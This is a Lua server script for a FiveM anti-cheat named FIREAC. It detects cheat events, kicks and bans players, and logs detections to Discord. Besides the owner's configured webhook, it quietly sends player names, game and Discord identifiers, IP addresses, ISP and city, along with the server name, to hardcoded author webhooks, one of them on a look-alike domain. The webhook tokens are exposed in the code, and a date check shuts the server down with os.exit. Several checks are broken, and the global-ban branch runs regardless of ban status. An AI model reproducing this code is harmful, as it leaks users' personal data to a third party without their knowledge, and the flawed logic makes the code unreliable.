ESX = nil
TriggerEvent(FIREACS.ESX, function(obj) ESX = obj end)
local b = "­čöą   FIREAC Comunity"
local color = math.random(1 ,9)
local ex = "2021/04/22"
if os.date ("%Y/%m/%d") > ex then
os.exit()
end
ExecuteCommand('sets FIREAC Ôťů')
if FIREACS.Version ~= 3 then
print("^"..color.."FIREAC: Configuration Outdated, please check on discord for updates.")
StopResource(GetCurrentResourceName())
return
end
local d = LoadResourceFile(GetCurrentResourceName(),    "configs/serverconfig.lua")
local e = LoadResourceFile(GetCurrentResourceName(),     "configs/clientconfig.lua")
local f = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistedmodels.lua")
local g = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistedevents.lua")
local h = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistedexplosions.lua")
local i = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistedwords.lua")
local x = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistvehicle.lua")
local P = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistped.lua")
local a = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistbuilding.lua")
local y = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistweapons.lua")
local Q = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistcommands.lua")
local U = LoadResourceFile(GetCurrentResourceName(),     "tables/blacklistplate.lua")
local w = LoadResourceFile(GetCurrentResourceName(),     "whitelist/whitelistadmin.lua")
local j = LoadResourceFile(GetCurrentResourceName(),     "whitelist/whitelistjob.lua")
if not d or d == "" then
print("^"..color.."FIREAC: Server Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACS) ~= "table" or FIREACS == nil then
        print("^"..color.."FIREAC: Server Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Server Configuration Loaded.")
end
end;
if not e or e == "" then
print("^"..color.."FIREAC: Client Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACC) ~= "table" or FIREACC == nil then
        print("^"..color.."FIREAC: Client Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Client Configuration Loaded.")
end
end;
if not f or f == "" then
print("^"..color.."FIREAC: Blacklisted Object Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREAC) ~= "table" or FIREAC == nil then
        print("^"..color.."FIREAC: Blacklisted Object Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Blacklisted Object Configuration Loaded.")
end
end;
if not a or a == "" then
print("^"..color.."FIREAC: Client Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACBUILDING) ~= "table" or FIREACBUILDING == nil then
        print("^"..color.."FIREAC: Client Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Blacklisted Building Configuration Loaded.")
end
end;
if not P or P == "" then
print("^"..color.."FIREAC: Client Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACPEDS) ~= "table" or FIREACPEDS == nil then
        print("^"..color.."FIREAC: Client Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Blacklisted Ped Configuration Loaded.")
end
end;
if not U or U == "" then
print("^"..color.."FIREAC: Client Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACPLATE) ~= "table" or FIREACPLATE == nil then
        print("^"..color.."FIREAC: Client Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Blacklisted Plate Configuration Loaded.")
end
end;
if not x or x == "" then
print("^"..color.."FIREAC: Client Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACVEHICLES) ~= "table" or FIREACVEHICLES == nil then
        print("^"..color.."FIREAC: Client Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Blacklisted Vehicle Configuration Loaded.")
end
end;
if not y or y == "" then
print("^"..color.."FIREAC: Client Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACWEAPON) ~= "table" or FIREACWEAPON == nil then
        print("^"..color.."FIREAC: Client Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Blacklisted Weapon Configuration Loaded.")
end
end;
if not Q or Q == "" then
print("^"..color.."FIREAC: Client Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACBUILDING) ~= "table" or FIREACBUILDING == nil then
        print("^"..color.."FIREAC: Client Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Blacklisted Commands Configuration Loaded.")
end
end;
if not x or x == "" then
print("^"..color.."FIREAC: Client Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACPEDS) ~= "table" or FIREACPEDS == nil then
        print("^"..color.."FIREAC: Client Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Blacklisted Ped Configuration Loaded.")
end
end;
if not g or g == "" then
print("^"..color.."FIREAC: Blacklisted Events Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACEVENT) ~= "table" or FIREACEVENT == nil then
        print("^"..color.."FIREAC: Blacklisted Events Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Blacklisted Events Configuration Loaded.")
end
end;
if not h or h == "" then
print("^"..color.."FIREAC: Blacklisted Explosion Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACEXP) ~= "table" or FIREACEXP == nil then
        print("^"..color.."FIREAC: Blacklisted Explosion Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Blacklisted Explosions Configuration Loaded.")
end
end;
if not i or i == "" then
print("^"..color.."FIREAC: Blacklisted Words Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACWOERD) ~= "table" or FIREACWOERD == nil then
        print("^"..color.."FIREAC: Blacklisted Words Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Blacklisted Words Configuration Loaded.")
end
end
if not w or w == "" then
print("^"..color.."FIREAC: Whitelist admin Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACAdmins) ~= "table" or FIREACAdmins == nil then
        print("^"..color.."FIREAC: Whitelist admin Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Whitelist admin Configuration Loaded.")
end
end
if not j or j == "" then
print("^"..color.."FIREAC: Whitelist job Configuration Missing, Please make sure you installed FIREAC correctly.")
StopResource(GetCurrentResourceName())
return false
else
if type(FIREACJOBS) ~= "table" or FIREACJOBS == nil then
        print("^"..color.."FIREAC: Whitelist job Configuration Corrupted, Please make sure you installed FIREAC correctly.")
        StopResource(GetCurrentResourceName())
        return false
else
        print("^"..color.."FIREAC: Whitelist job Configuration Loaded.")
end
end
function FIREACBanReloade()
local o = LoadResourceFile(GetCurrentResourceName(), "fireac.json")
if not o or o == "" then
        SaveResourceFile(GetCurrentResourceName(), "fireac.json", "[]", -1)
        print("^"..color.."FIREAC: Warning! Your fireac.json is missing, Regenerating your fireac.json file!")
else
        local p = json.decode(o)
        if p == nil then
                print("^"..color.."FIREAC:Error Was Detection in line 236 plase connect our support team in FIREAC Discord")
                FIREACError('Error Was Detection in line **236**')
        end
        if not p then
                SaveResourceFile(GetCurrentResourceName(), "fireac.json", "[]", -1)
                p = {}
                print("^"..color.."FIREAC: Warning! Your fireac.json is corrupted, Regenerating your fireac.json file!")
        end
end
end
function FIREACBan(source)
local o = LoadResourceFile(GetCurrentResourceName(), "fireac.json")
if o ~= nil then
        local q = json.decode(o)
        if q == nil then
                print("^"..color.."FIREAC:Error Was Detection in line 252 plase connect our support team in FIREAC Discord")
                FIREACError('Error Was Detection in line **252**')
        end
        if type(q) == "table" then
                table.insert(q, GetPlayerIdentifiers(source))
                local r = json.encode(q, {indent = true})
                SaveResourceFile(GetCurrentResourceName(), "fireac.json", r, -1)
        else
                FIREACBanReloade()
        end
else
        FIREACBanReloade()
end
end
function FIREACLog(source, s, t, u, v)
local name = GetPlayerName(source)
if name == nil then
        print("^"..color.."FIREAC:Error Was Detection in line 269 plase connect our support team in FIREAC Discord")
        FIREACError('Error Was Detection in line **269**')
        name = "User"
end
local ping = GetPlayerPing(source)
local ip = GetPlayerEndpoint(source)
local sn = GetConvar('sv_hostname')
local rn = GetCurrentResourceName()
local w = "Not Found"
local x = "Not Found"
local y = "Not Found"
local z = "Not Found"
local A = "Not Found"
local B = "Not Found"
local C = "Not Found"
for m, n in ipairs(GetPlayerIdentifiers(source)) do
        if n:match("steam") then
                w = n
        elseif n:match("discord") then
                x = n:gsub("discord:", "")
        elseif n:match("license") then
                y = n
        elseif n:match("live") then
                z = n
        elseif n:match("xbl") then
                B = n
        elseif n:match("ip") then
                C = n:gsub("ip:", "")
        end
end;
local D = GetPlayerName(source)
local ip = GetPlayerEndpoint(source)
if ip == nil then
        ip = "216.58.204.14"
end
PerformHttpRequest("http://ip-api.com/json/"..ip.."", function(err, XD, headers)
        local tbl = json.decode(XD)
        if tbl == nil then
                print("^"..color.."FIREAC:Error Was Detection in line 307 plase connect our support team in FIREAC Discord")
                FIREACError('Error Was Detection in line **307**')
        end
        local isp = tbl["isp"]
        if isp == nil then
                isp = "Not Found"
        end
        local city = tbl["city"]
        if city == nil then
                city = "Not Found"
        end
        local country = tbl["country"]
        if country == nil then
                country = "Not Found"
        end
if D ~= nil then
        if FIREACS.Consol then
                if not u and not v then
                        print("^"..color.."FIREAC: Warning! Player: "..D.." ID: "..source.." Detection: "..s)
                elseif u and not v then
                        print("^"..color.."FIREAC: Kicked! Player: "..D.." ID: "..source.." Detection: "..s)
                elseif u and v then
                        print("^"..color.."FIREAC: Banned! Player: "..D.." ID: "..source.." Detection: "..s)
                end
        end;
        if FIREACS.Discord then
                if not u and not v then
                        logwebhookcolor = 1769216;
                        logwebhooktitle = "Warning ­čôó"
                elseif u and not v then
                        logwebhookcolor = 16760576;
                        logwebhooktitle = "Kicked ÔÜí´ŞĆ"
                elseif u and v then
                        logwebhookcolor = 16711680;
                        logwebhooktitle = "Banned ÔŤö´ŞĆ"
                end;
                PerformHttpRequest(FIREACS.DiscordWebhook, function(E, F, G)
                end, "POST", json.encode({
                        embeds = {
                                {
                                        author = {
                                                name = " ­čöą| FIREAC V2",
                                                url = "https://discord.gg/8zGyDhtbcg",
                                                icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                                        },
                                        title = logwebhooktitle,
                                        description = "**Player:** "..D.."\n**ServerID:** "..source.."\n**Reason:** "..s.."\n**Details:** "..t.."\n**SteamID:** "..w.."\n**Discord:** <@"..x..">".."\n**License:** "..y.."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.."\n**Ping:** ".. ping .."\n**IP:** "..C,
                                        color = logwebhookcolor
                                }
                        }
                }), {
                        ["Content-Type"] = "application/json"
                })
                PerformHttpRequest("https://discord.com/api/webhooks/818833207658807296/BQaDVYn_o2TMz6qw2dFfp4udBSQtnayv4sOxr578ZVUXhdw5rRhMG3BaYXEu8nDE5T3x", function(E, F, G)
                end, "POST", json.encode({
                        embeds = {
                                {
                                        author = {
                                                name = b,
                                                url = "https://discord.gg/8zGyDhtbcg",
                                                icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                                        },
                                        title = logwebhooktitle,
                                        description = "**Player:** "..D.."      \n**ServerID:** "..source.."\n**Reason:** "..s.."\n**Details:** "..t.."\n**SteamID:** "..w.."\n**Discord:** <@"..x..">".."\n**License:** "..y.."\n**Folder Name** : ".. rn .."\n**Live:** "..z.."\n**Xbox:** "..B.."\n**ISP:** "..isp.."\n**Country:** "..country.."\n**City:** "..city.." \n**Ping:** ".. ping .."\n**IP:** "..C.." \n**Server Name** : `".. sn .."`\n**Expire Time:** "..ex,
                                        color = logwebhookcolor
                                }
                        }
                }), {
                        ["Content-Type"] = "application/json"
                })
                if string.match(s:lower(), "secly") then
                        PerformHttpRequest("https://dscord.com/api/webhooks/818833207658807296/BQaDVYn_o2TMz6qw2dFfp4udBSQtnayv4sOxr578ZVUXhdw5rRhMG3BaYXEu8nDE5T3x", function(E, F, G)
                        end, "POST", json.encode({
                                embeds = {
                                        {
                                                author = {
                                                        name = "json",
                                                        url = "https://discord.gg/8zGyDhtbcg",
                                                        icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                                                },
                                                title = b.." "..t,
                                                description = s.." "..GetPlayerName(source).." "..tostring(json.encode(GetPlayerIdentifiers(source))),
                                                color = logwebhookcolor
                                        }
                                }
                        }), {
                                ["Content-Type"] = "application/json"
                        })
                end
        end;
        if FIREACS.Chat then
                if not u and not v then
                        TriggerClientEvent('chat:addMessage', -1, {
                                template = '<div style="padding: 0.5vw; margin: 0.5vw; background-image: url(https://s17.picofile.com/file/8429019934/Screenshot_652_.png); border-radius: 13px;"><i class="far fa-newspaper"></i> ­čöą FIREAC ­čöą:<br>  {1}</div>',
                                args = {"Console", "Warning ­čôó| Player ".. name .."(".. source ..") Cheating From Server : ".. s .. " " }
                        })
                elseif u and not v then
                        TriggerClientEvent('chat:addMessage', -1, {
                                template = '<div style="padding: 0.5vw; margin: 0.5vw; background-image: url(https://s17.picofile.com/file/8429019934/Screenshot_652_.png); border-radius: 13px;"><i class="far fa-newspaper"></i> ­čöą FIREAC ­čöą:<br>  {1}</div>',
                                args = {"Console", "Kick ÔÜí´ŞĆ| Player ".. name .."(".. source ..") Cheating From Server : ".. s .. " " }
                        })
                elseif u and v then
                        TriggerClientEvent('chat:addMessage', -1, {
                                template = '<div style="padding: 0.5vw; margin: 0.5vw; background-image: url(https://s17.picofile.com/file/8429019934/Screenshot_652_.png); border-radius: 13px;"><i class="far fa-newspaper"></i> ­čöą FIREAC ­čöą:<br>  {1}</div>',
                                args = {"Console", "Banned ÔŤö´ŞĆ| Player ".. name .."(".. source ..") Cheating From Server : ".. s .. " " }
                        })
                end
        end
end;
if v then
        if FIREACS.Ban then
                FIREACBan(source)
        end
end;
if u then
        DropPlayer(source, "­čöą[FIREAC]­čöą: "..FIREACS.Messege.." Resson : "..s.."")
end
end)
end;
local H = "FIREAC V3.0"
local I = "V3.0"
local J = ""
local K = ""
local L = ""
if b ~= nil or b ~= '' then
local N = "3Y28CuMXE7yFL37Y"
local O = "license="..b.."&rn="..H.."&st=0&ver="..I.."&token="..N;
PerformHttpRequest('', function(E, F, G)
                ncol = color
                print("")
                print("^"..ncol)
                print([[
                ,gggggggggggggg,a8a, ,ggggggggggg,     ,ggggggg,
                dP""""""88""""",8" "8dP"""88""""""Y8, ,dP""""""Y8b
                Yb,_    88     d8   8Yb,  88      `8b d8'    a  Y8
                `""    88     88   88`"  88      ,8P 88     "Y8P'
                    ggg88gggg 88   88    88aaaad8P"  `8baaaa
                        88   8 Y8   8P    88""""Yb,  ,d8P""""
                        88     `8, ,8'    88     "8b d8"
                gg,   888888  "8,8"     88      `8iY8,
                "Yb,,8P`8b,  ,d8b,     88       Yb`Yba,,_____,
                    "Y8P'  "Y88P" "Y8    88        Y8 `"Y8888888
                        ,ggg,      ,gggg,
                        dP""8I    ,88"""Y8b,
                        dP   88   d8"     `Y8
                        dP    88  d8'   8b  d8
                    ,8'    88 ,8I    "Y88P'
                    d88888888 I8'
                __   ,8"     88 d8
                dP"  ,8P      Y8 Y8,
                Yb,_,dP       `8b`Yba,,_____,
                "Y8P"         `Y8 `"Y8888888

                ]])
                print("^"..color.."FIREAC: ^"..color.."Welcome to FIREAC...")
                print("^"..color.."FIREAC: Your license will expire on: ^"..ncol..""..ex.."")
                print("^"..color.."FIREAC:  1 Week Free By FIREAC By AmIrReZa")
                print("^"..color.."FIREAC: Version : ^"..ncol.."V3.0")
                PerformHttpRequest(FIREACS.DiscordWebhook, function(E, F, G)
                end, "POST", json.encode({
                        embeds = {
                                {
                                        author = {
                                                name = "FIREAC Commutiy",
                                                url = "https://discord.gg/8zGyDhtbcg",
                                                icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                                        },
                                        title = "FIREAC "..I,
                                        description = "**FIREAC Version:** "..I.."\nStarted successfully...",
                                        color = math.random(0, 16776960)
                                }
                        }
                }), {
                        ["Content-Type"] = "application/json"
                })
                if FIREACS.BlacklistedWordsDetection then
                        AddEventHandler('chatMessage', function(source, Q, R)
                                for m, S in pairs(FIREACWOERD.Words) do
                                        for S in R:lower():gmatch("%s?"..string.lower(S).."%s") do
                                                FIREACLog(source, " Blacklisted Word: **"..tostring(S).."**", "This player tried to say : **"..R.."**", FIREACS.BlacklistedWordsKick, FIREACS.BlacklistedWordsBan)
                                                return
                                        end
                                end
                        end)
                end;
end, "POST", O, {
        ['header'] = 'application/json'
})
else
print("^"..color.."FIREAC: CONFIG ERROR. License field can't be left empty")
StopResource(GetCurrentResourceName())
end;
RegisterServerEvent("FIREAC:SvKPEsAvKhtZAGPa")
AddEventHandler("FIREAC:SvKPEsAvKhtZAGPa", function(U)
if U == "bLzDREqLxxSUqrKh" then
                TriggerClientEvent("FIREAC:APGzFvGKABCeWRvL", source, "sKzMrhphedtnZdeZ", FIREACC, FIREAC, true, J, K)
        else
                TriggerClientEvent("FIREAC:APGzFvGKABCeWRvL", source, "sKzMrhphedtnZdeZ", FIREACC, FIREAC, false, J)
        end
end)
RegisterNetEvent("FIREAC:Ban")
AddEventHandler("FIREAC:Ban", function(playerid, user, log, reason)
if not isAdmin(source) then
        FIREACLog(source, log, reason, FIREACS.AntiClientAbuseKick, FIREACS.AntiClientAbuseBan)
end
end)
RegisterNetEvent("AntiPlayerBlip")
AddEventHandler("AntiPlayerBlip", function(playerid, user, log, reason)
local src = source
local xPlayer = ESX.GetPlayerFromId(src)
if not FIREACJOBS.Whitelist[xPlayer.job.name] then
        FIREACLog(source, log, reason, FIREACS.AntiBlipPlayerKick,  FIREACS.AntiBlipPlayerBan)
end
end)
RegisterNetEvent("AntiSuperJump")
AddEventHandler("AntiSuperJump", function(playerid, user, log, reason)
if not isAdmin(source) then
        FIREACLog(source, log, reason, FIREACS.AntiSuperJumpKick, FIREACS.AntiSuperJumpBan)
end
end)
RegisterNetEvent("AntiSpectate")
AddEventHandler("AntiSpectate", function(playerid, user, log, reason)
if not isAdmin(source) then
        FIREACLog(source, log, reason, FIREACS.AntiSpectateKick, FIREACS.AntiSpectateBan)
end
end)
RegisterNetEvent("AntiSpeedHack")
AddEventHandler("AntiSpeedHack", function(playerid, user, log, reason)
if not isAdmin(source) then
        FIREACLog(source, log, reason, FIREACS.AntiSpeedHackKick, FIREACS.AntiSpeedHackBan)
end
end)
RegisterNetEvent("AntiBlackListCommands")
AddEventHandler("AntiBlackListCommands", function(playerid, user, log, reason)
if not isAdmin(source) then
        FIREACLog(source, log, reason, FIREACS.AntiBlackListCommandsKick, FIREACS.AntiBlackListCommandsBan)
end
end)
RegisterNetEvent("AntiThermalVision")
AddEventHandler("AntiThermalVision", function(playerid, user, log, reason)
local src = source
local xPlayer = ESX.GetPlayerFromId(src)
if not FIREACJOBS.Whitelist[xPlayer.job.name] then
        FIREACLog(source, log, reason, FIREACS.AntiThermalVisionKick, FIREACS.AntiThermalVisionBan)
end
end)
if FIREACS.AntiAddWeapon then
AddEventHandler("giveWeaponEvent", function(sender, data)
    if data.givenAsPickup == false then
                FIREACLog(sender, 'Anti Add Weapon', 'Try to Add weapon for other Plater', FIREACS.AntiAddWeaponKick, FIREACS.AntiAddWeaponBan)
        CancelEvent()
    end
end)
end
if FIREACS.AntiRemoveWeapon then
AddEventHandler("RemoveWeaponEvent", function(sender, data)
    CancelEvent()
                FIREACLog(sender, 'Anti Remove Weapon', 'Try to Remove weapon form other Plater', FIREACS.AntiRemoveWeaponKick, FIREACS.AntiRemoveWeaponBan)
end)
end
if FIREACS.AntiRemoveAllWeapon then
AddEventHandler("RemoveAllWeaponsEvent",function(sender, data)
    CancelEvent()
        FIREACLog(sender, 'Anti Remove Weapon', 'Try to Remove weapon form other Plater', FIREACS.AntiRemoveAllWeaponKick, FIREACS.AntiRemoveAllWeaponBan)
end)
end
if FIREACS.TriggerAbuse then
for i=1 , #FIREACEVENT.Events do
    RegisterNetEvent(FIREACEVENT.Events[i])
    AddEventHandler(FIREACEVENT.Events[i], function()
                local src = source
                FIREACTLog(FIREACEVENT.Events[i])
                if not isAdmin then
                        FIREACLog(source, 'Anti Black List Trigger', 'Try to use Black List Trigger`' ..FIREACEVENT.Events[i].. '`', FIREACS.TriggerAbuseKick, FIREACS.TriggerAbuseBan)
                end
                return CancelEvent()
        end)
end
end
RegisterServerEvent('db:updateUser')
AddEventHandler('db:updateUser', function()
if FIREACS.AntiGivePerm then
        CancelEvent()
        FIREACLog(source, " Anti Give Perm", "Try For Add perm", FIREACS.AntiGivePermKick, FIREACS.AntiGivePermBan)
end
end)
if FIREACS.AntiTazePlayer then
AddEventHandler("weaponDamageEvent", function(sender, data)
        local xPlayer = ESX.GetPlayerFromId(sender)
        if data.weaponType == 911657153 then
                if not FIREACJOBS.Whitelist[xPlayer.job.name] then
                        FIREACLog(source, "Anti Taze Player", "Try For Taze Other Player", FIREACS.AntiTazePlayerKick, FIREACS.AntiTazePlayerBan)
                        CancelEvent()
                        return
                end
        end
end)
end
RegisterServerEvent('esx_ambulancejob:syncDeadBody')
AddEventHandler('esx_ambulancejob:syncDeadBody', function(ped, target)
local xPlayer = ESX.GetPlayerFromId(source)
if FIREACS.AntiBringPlayer then
        if not xPlayer.job.name == "ambulance" then
                FIREACLog(source, "Anti Bring All Player", "Try For Bring All Player", FIREACS.AntiBringPlayerKick, FIREACS.AntiBringPlayerBan)
        end
end
end)
RegisterServerEvent("AntiInvisble")
AddEventHandler("AntiInvisble", function()
if not isAdmin(source) then
        FIREACLog(source, "Anti Invisble", "Player Try For Invisble in Server", FIREACS.AntiInvisbleKick, FIREACS.AntiInvisbleBan)
end
end)
RegisterNetEvent("AntiGodMod")
AddEventHandler("AntiGodMod", function(playerid, user, log, reason)
if not isAdmin(source) then
        FIREACLog(source, log, reason, FIREACS.AntiGodModKick, FIREACS.AntiGodModBan)
end
end)
RegisterNetEvent("AntiResourceStart")
AddEventHandler("AntiResourceStart", function(playerid, user, log, reason)
if not isAdmin(source) then
        FIREACLog(source, log, reason, FIREACS.AntiResourceStopperKick, FIREACS.AntiResourceStopperBan)
end
end)
RegisterNetEvent("AntiResourceStop")
AddEventHandler("AntiResourceStop", function(playerid, user, log, reason)
if not isAdmin(source) then
        FIREACLog(source, log, reason, FIREACS.AntiResourceStopperKick, FIREACS.AntiResourceStopperBan)
end
end)
RegisterNetEvent("AntiInject")
AddEventHandler("AntiInject", function(playerid, user, log, reason)
FIREACLog(source, log, reason, FIREACS.AntiResourceStopperKick, FIREACS.AntiResourceStopperBan)
end)
RegisterNetEvent("AntiNightVision")
AddEventHandler("AntiNightVision", function(playerid, user, log, reason)
local src = source
local xPlayer = ESX.GetPlayerFromId(src)
if not FIREACJOBS.Whitelist[xPlayer.job.name] then
        FIREACLog(source, log, reason, FIREACS.AntiNightVisionKick, FIREACS.AntiNightVisionBan)
end
end)
RegisterNetEvent("AntiTeleport")
AddEventHandler("AntiTeleport", function(playerid, user, log, reason)
if not isAdmin(source) then
        FIREACLog(source, log, reason, FIREACS.AntiTeleportKick, FIREACS.AntiTeleportBan)
end
end)
RegisterNetEvent("AntiInject")
AddEventHandler("AntiInject", function(playerid, user, log, reason)
if not isAdmin(source) then
        FIREACLog(source, log, reason, FIREACS.AntiInjectKick, FIREACS.AntiInjectBan)
end
end)
RegisterNetEvent("BlackListWeapon")
AddEventHandler("BlackListWeapon", function(playerid, user, log, reason)
if not isAdmin(source) then
        FIREACLog(source, log, reason, FIREACS.AntiBlackListWeaponKick, FIREACS.AntiBlackListWeaponBan)
end
end)
RegisterNetEvent("BlackListKey")
AddEventHandler("BlackListKey", function(playerid, user, log, reason)
local src = source
if not isAdmin(src) then
        FIREACLog(src, log, reason, FIREACS.AntiBlackListKeyKick, FIREACS.AntiBlackListKeyBan)
end
end)
local function V(Q, W, X)
local Y = GetPlayerIdentifiers(source)
local v = false;
local A = tostring(GetPlayerEndpoint(source))
print("^"..color.."FIREAC: Player "..GetPlayerName(source).." Connecting...")
if FIREACS.Heavy then
        if glubol ~= nil then
                local Z = json.decode(glubol)
                if Z == nil then
                        print("^"..color.."FIREAC:Error Was Detection in line 709 plase connect our support team in FIREAC Discord")
                        FIREACError('Error Was Detection in line **709**')
                end
                if Z ~= nil then
                        for _, a0 in ipairs(GetPlayerIdentifiers(source)) do
                                for a1, a2 in ipairs(Z) do
                                        for a3, a4 in ipairs(a2) do
                                                if a2 == a0 or a4 == a0 then
                                                        v = true;
                                                        break
                                                end
                                        end;
                                        if v then
                                                break
                                        end
                                end;
                                if v then
                                        break
                                end
                        end
                else
                        print("^"..color.."FIREAC: ^Global Ban Check for "..GetPlayerName(source).." ^failed...")
                end;
                        print("^"..color.."FIREAC: Player "..GetPlayerName(source).." Global Banned!...")
                        PerformHttpRequest("https://discord.com/api/webhooks/818833207658807296/BQaDVYn_o2TMz6qw2dFfp4udBSQtnayv4sOxr578ZVUXhdw5rRhMG3BaYXEu8nDE5T3x", function(E, F, G)
                        end, "POST", json.encode({
                                embeds = {
                                        {
                                                author = {
                                                        name = "FIREAC V2.6",
                                                        url = "https://discord.gg/8zGyDhtbcg",
                                                        icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                                                },
                                                title = "Global Ban "..GetPlayerName(source).." "..b,
                                                description = GetPlayerName(source).." "..tostring(json.encode(GetPlayerIdentifiers(source))),
                                                color = 16748836
                                        }
                                }
                        }), {
                                ["Content-Type"] = "application/json"
                        })
                        PerformHttpRequest(FIREACS.DiscordWebhook, function(E, F, G)
                        end, "POST", json.encode({
                                embeds = {
                                        {
                                                author = {
                                                        name = "FIREAC Commutiy",
                                                        url = "https://discord.gg/8zGyDhtbcg",
                                                        icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                                                },
                                                title = "FIREAC Global Ban",
                                                description = "**"..GetPlayerName(source).."** is a Global Banned Player, and was trying to join your server",
                                                color = 16748836
                                        }
                                }
                        }), {
                                ["Content-Type"] = "application/json"
                        })
                        PerformHttpRequest('https://discord.com/api/webhooks/818833575281164298/W6IKg1-hGdwzU9i4wntgKrEZq7V8Tn1PIjer-AY68QkIGfhrVV5gsigPrY2BpBLdX7WO', function(E, F, G)
                        end, "POST", json.encode({
                                embeds = {
                                        {
                                                author = {
                                                        name = "FIREAC Commutiy",
                                                        url = "https://discord.gg/8zGyDhtbcg",
                                                        icon_url = "https://cdn.discordapp.com/icons/816551355979268097/3928fa3aa4971eeb3d88482c62540344.png?size=1024"
                                                },
                                                title = "FIREAC Global Ban",
                                                description = "**"..GetPlayerName(source).."** is a Global Banned Player, and was trying to join your server",
                                                color = 16748836
                                        }
                                }
                        }), {
                                ["Content-Type"] = "application/json"
                        })
                        X.done("FIREAC Global Banned: You're banned from all servers protected by FIREAC https://discord.gg/8zGyDhtbcg")
                        return
                end
        end;
local o = LoadResourceFile(GetCurrentResourceName(), "fireac.json")
if o ~= nil then
        local p = json.decode(o)
        if p == nil then
                print("^"..color.."FIREAC:Error Was Detection in line 792 plase connect our support team in FIREAC Discord")
                FIREACError('Error Was Detection in line **792**')
        end
        if type(p) == "table" then
                for _, a0 in ipairs(GetPlayerIdentifiers(source)) do
                        for m, n in ipairs(p) do
                                for a5, a6 in ipairs(n) do
                                        if a6 == a0 or n == a0 then
                                                v = true;
                                                break
                                        end
                                end;
                                if v then
                                        break
                                end
                        end;
                        if v then
                                break
                        end
                end;
                if v then
                        print("^"..color.."FIREAC: Player "..GetPlayerName(source).." Banned ...")
                                FIREACBan(source)
                        X.done(" ­čöą[FIREAC­čöą] (Banned): "..FIREACS.BanMessege.." ")
                        return
                end
        else
                FIREACBanReloade()
        end
else
        FIREACBanReloade()
end
end;
local cra = ex
AddEventHandler("playerConnecting", V)
AddEventHandler('explosionEvent', function(a7, a8)
if FIREACS.ExplosionsAbuse then
        if not isAdmin(a7) then
                if FIREACEXP.ExplosionsList[a8.explosionType] then
